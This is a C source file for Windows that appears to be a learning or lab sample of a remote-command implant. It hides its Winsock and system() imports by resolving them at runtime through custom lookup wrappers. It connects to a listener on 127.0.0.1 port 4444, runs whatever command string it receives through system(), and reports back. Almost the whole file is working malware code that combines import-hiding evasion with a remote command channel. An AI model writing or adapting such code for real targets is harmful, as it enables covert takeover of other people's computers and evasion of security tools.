#include "FunctionsSignatures.h"
#include <stdio.h>
#include <winsock2.h>
#include <Windows.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library


int main()
{
	//===============================================  Creating a alias variables for the functions we want to hide  =======================================================


	HIDDEN_DLL_FUNC_WSAStartup pWSAStartup;
	pWSAStartup = (HIDDEN_DLL_FUNC_WSAStartup)pGetProcAddress(pGetModuleHandle(L"Ws2_32.dll"), (char*)"WSAStartup");

	HIDDEN_DLL_FUNC_WSAGetLastError pWSAGetLastError;
	pWSAGetLastError = (HIDDEN_DLL_FUNC_WSAGetLastError)pGetProcAddress(pGetModuleHandle(L"Ws2_32.dll"), (char*)"WSAGetLastError");

	HIDDEN_DLL_FUNC_WSASocket pWSASocket;
	pWSASocket = (HIDDEN_DLL_FUNC_WSASocket)pGetProcAddress(pGetModuleHandle(L"Ws2_32.dll"), (char*)"WSASocketW");

	HIDDEN_DLL_FUNC_inet_addr pInet_addr;
	pInet_addr = (HIDDEN_DLL_FUNC_inet_addr)pGetProcAddress(pGetModuleHandle(L"Ws2_32.dll"), (char*)"inet_addr");

	HIDDEN_DLL_FUNC_WSAConnect pWSAConnect;
	pWSAConnect = (HIDDEN_DLL_FUNC_WSAConnect)pGetProcAddress(pGetModuleHandle(L"Ws2_32.dll"), (char*)"WSAConnect");

	HIDDEN_DLL_FUNC_send pSend;
	pSend = (HIDDEN_DLL_FUNC_send)pGetProcAddress(pGetModuleHandle(L"Ws2_32.dll"), (char*)"send");

	HIDDEN_DLL_FUNC_recv pRecv;
	pRecv = (HIDDEN_DLL_FUNC_recv)pGetProcAddress(pGetModuleHandle(L"Ws2_32.dll"), (char*)"recv");


	HIDDEN_DLL_FUNC_system pSystem;                                   // "ucrtbase.dll" in Release mode,  "ucrtbased.dll" in Debug mode.
	pSystem = (HIDDEN_DLL_FUNC_system)pGetProcAddress(pGetModuleHandle(L"ucrtbase.dll"), (char*)"system");



	SOCKET sock;
	struct sockaddr_in sock_addr;
	WSADATA wsa;
	char ip_addr[] = "127.0.0.1";
	int port = 4444;
	int result;

	// Initialize the use of WinSock DLL by the process.
	result = pWSAStartup(MAKEWORD(2,2), &wsa);
	if (result != 0)
	{
		printf("\WSAStartup failed....  Error code: %d", pWSAGetLastError());
		exit(EXIT_FAILURE);
	}

	// Creates an unconfigured socket 
	sock = pWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
	if (sock == INVALID_SOCKET)
	{
		printf("\WSASocket failed....  Error code: %d", pWSAGetLastError());
		exit(EXIT_FAILURE);
	}

	sock_addr.sin_port = htons(port);
	sock_addr.sin_family = AF_INET;
	sock_addr.sin_addr.s_addr = pInet_addr(ip_addr);


	result = pWSAConnect(sock, (SOCKADDR*)&sock_addr, sizeof(sock_addr), NULL, NULL, NULL, NULL);
	if (result == SOCKET_ERROR)
	{
		printf("\nWSAConnect failed....  Error code: %d", pWSAGetLastError());
		exit(EXIT_FAILURE);
	}

	//recive a string message.
	char server_response[4096] = {0};
	int byte_amount = pRecv(sock, server_response, sizeof(server_response), 0);
	printf("\n[+] Message recived: %s", server_response);
	pSystem(server_response);

	char message[45] = "Command was executed, closing connection...";
	pSend(sock, message, sizeof(message), 0);
	printf("\n[+] Message sent to server");

	printf("\nPress key to exit...");
	getchar();
}